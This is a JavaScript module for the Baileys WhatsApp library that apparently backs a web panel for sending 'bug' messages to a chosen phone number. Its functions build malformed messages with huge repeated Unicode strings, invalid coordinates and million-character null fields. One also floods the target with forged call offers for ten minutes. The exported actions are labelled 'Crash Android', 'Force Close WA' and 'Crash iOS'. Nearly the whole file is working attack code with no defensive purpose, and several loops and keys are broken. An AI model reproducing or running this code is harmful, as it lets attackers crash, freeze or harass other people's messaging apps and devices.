const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const crypto = require('crypto');

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- Fungsi Inti (Payload) ---

async function dileyflow(sock, target) {
  try {
    const msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body: { text: "DILEY BY BERAS JAYA", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\x10".repeat(10000)
        },
        contextInfo: {
          mentionedJid: [
                   "0@s.whatsapp.net",
                      ...Array.from(
                      { length: 1900 },
                      () => 
                      "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                       ),
                   ],
          forwardingScore: 999,
          isForwarded: true
        }
      }
    }, {});
    
    await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
  } catch (err) {
    console.log(err.message)
  }
}
async function clickCrashBlankDelay(sock, target) {
  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " @xrelly ",
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.9999999999999,
                name: " Tr4sh Xrelly ",
                address: "X",
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "[".repeat(5000),
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: "{".repeat(3888),
                },
              ],
              messageParamsJson: "Wa.me/stickerpack/xrelly",
              messageVersion: 1,
            },
          },
        },
      },
    },
    { participant: { jid: target } },
  );

  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "༘XrL‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "༘XrL‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {},
        packDescription: "XrL ༘‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    },
    {},
  );

  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "XrL",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\u0000".repeat(1000000),
              version: 2,
            },
          },
        },
      },
    },
    {
      participant: {
        jid: target,
      },
    },
  );
}
async function DnxBlank(sock, target) {
  try {

    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ꦽ".repeat(2000),
              hasMediaAttachment: true,
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0
              }
            },
            body: {
              text: "DENIX EMPEROR" + "𑇂𑆵𑆴𑆿".repeat(2000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{}",
            },
            contextInfo: {
              forwardingScore: 100,
              isForwarded: true,
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
            }
          }
        }
      }
    };

    const msg2 = {
      pollCreationMessage: {
        name: " DENIX GNTNG ", 
        options: [
          "𑇂𑆵𑆴𑆿".repeat(1000),
          "ꦽ".repeat(1000),
          "𑇂𑆵𑆴𑆿".repeat(1000),
          "ꦽ".repeat(1000)
        ],
      }
    };

    const msg3 = {
      templateButtonReplyMessage: {
        templateId: "ꦽ".repeat(1000),
        replyButtonMessageId: "ꦽ".repeat(1000),
        title: "ꦽ".repeat(1000),
        footer: "ꦽ".repeat(1000),
        bodyText: "ꦽ".repeat(1000),
        buttons: [
          {
            buttonId: "ꦽ".repeat(1000),
            buttonText: {
              displayText: "ꦽ".repeat(1000)
            },
          },
        ],
      }
    };

    for (let i = 0; i < 10; i++) {
      await sock.relayMessage(target, msg1, { participant: null });
      await sock.relayMessage(target, msg2, { participant: null });
      await sock.relayMessage(target, msg3, { participant: null });
    }

  } catch (e) {
    console.error(e);
  }
}
async function VisiFriend(dava, target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");
    let devices = (
        await dava.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await dava.assertSessions(devices);

    let node1 = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let node2 = node1();
    let node3 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let node4 = dava.createParticipantNodes.bind(dava);
    let node5 = dava.encodeWAMessage?.bind(dava);

    dava.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (dava.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = dava.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = node3(
                    node5 ? node5(msg) : encodeWAMessage(msg)
                );

                return node2.mutex(jid, async () => {
                    let { type, ciphertext } = await dava.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 10 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        for (let i = 0; i < 10; i++) {
            let awik = crypto.randomBytes(32);
            let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

            let {
                nodes: destinations,
                shouldIncludeDeviceIdentity
            } = await dava.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            let lemiting = {
                tag: "call",
                attrs: {
                    to: target,
                    id: dava.generateMessageTag(),
                    from: dava.user.id
                },
                content: [{
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": dava.user.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },

                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },

                        { tag: "net", attrs: { medium: "3" } },

                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                        },

                        { tag: "encopt", attrs: { keygen: "2" } },

                        { tag: "destination", attrs: {}, content: destinations },

                        ...(shouldIncludeDeviceIdentity ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(dava.authState.creds.account, true)
                        }] : [])
                    ]
                }]
            };

            await dava.sendNode(lemiting);
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }

        try {
            await dava.chatModify({ clear: true }, target);
            console.log("KONEKSI");
        } catch (error) {
            console.error("GAGAL:", error);
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
    console.log(chalk.red("Succesfully Attack Target By : @DavaXploitt"));  
}
async function crashuiandrox(sock, target) {
 let msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          title: " Xnxx ",
          body: {
            text: " Flavour The Ovalium" + "ꦽ".repeat(5000),
          },
          footer: {
            text: " Fuck You Bitch "
          },
          contextInfo: {
            remoteJid: " dnd :) ",
            participant: "13135559098@s.whatsapp.net",
            mentionedJid: ["status@broadcast"],
            isForwarded: true,
            fromMe: false,
            forwardingScore: 9999,
            expiration: 7205,
            ephemeralSettingTimestamp: 2502
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "{}"
              },
              {
                name: "form_message",
                buttonParamsJson: "{}"
              },
              {
                name: "address_message",
                buttonParamsJson: "{}"
              }
            ],
            messageParamsJson: "",
            messageVersion: 3
          }
        }
      }
    }
  }, {})
  
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  
  const msg2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "#Xw4r Eror",
            },
            body: {
              text: "Erorr Me",
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                key: "value".repeat(2000),
                id: Date.now(),
              }),
            },
          },
          contextInfo: {
            remoteJid: target,
            participant: target,
            stanzaId: sock.generateMessageTag(),
          },
        },
      },
    };
    
    const msg3 = generateWAMessageFromContent(target, msg2, {});

    await sock.relayMessage(target, msg3.msg2, {
      messageId: msg3.key.id,
    });
    console.log("SUCCES SEND BUG");
 }
// --- Mapping ID (Actions) ---
// Pastikan key (delay, crash, dll) sama dengan data-val di HTML
const actions = {
    "delay": {
        name: "Delay Invisible",
        execute: async (sock, target, jumlah = 10) => {
            for (let i = 50; i < jumlah; i++) {
                await dileyflow(sock, target);
                await sleep(200);
            }
        }
    },
    "crash": {
        name: "Crash Android",
        execute: async (sock, target, jumlah = 10) => {
            for (let i = 10; i < jumlah; i++) {
                // Fix: Menggunakan HxDCaelus karena QcPay tidak ada
                await clickCrashBlankDelay(sock, target);
                await sleep(200);
            }
        }
    },
    "blank": {
        name: "Crash Ios",
        execute: async (sock, target, jumlah = 5) => {
            for (let i = 10; i < jumlah; i++) {
                await DnxBlank(sock, target);
                await VisiFriend(sock, target);
                await sleep(200);
            }
        }
    },
    "fcandro": {
        name: "Force Close WA",
        execute: async (sock, target, jumlah = 5) => {
            for (let i = 10; i < jumlah; i++) {
                await VisiFriend(sock, target);
                await crashuiandrox(sock, target);
                await sleep(200);
            }
        }
    },
    "blank": {
        name: "Blank Android",
        execute: async (sock, target, jumlah = 5) => {
            for (let i = 10; i < jumlah; i++) {
                await DnxBlank(sock, target);
                await VisiFriend(sock, target);
                await sleep(200);
            }
        }
    },
    "fcios": {
        name: "Force Close iOS",
        execute: async (sock, target, jumlah = 5) => {
            for (let i = 10; i < jumlah; i++) {
                await VisiFriend(sock, target);
                await DnxBlank(sock, target);
                await sleep(200);
            }
        }
    }
};
// Export agar bisa dibaca oleh app.js / server.js
module.exports = actions;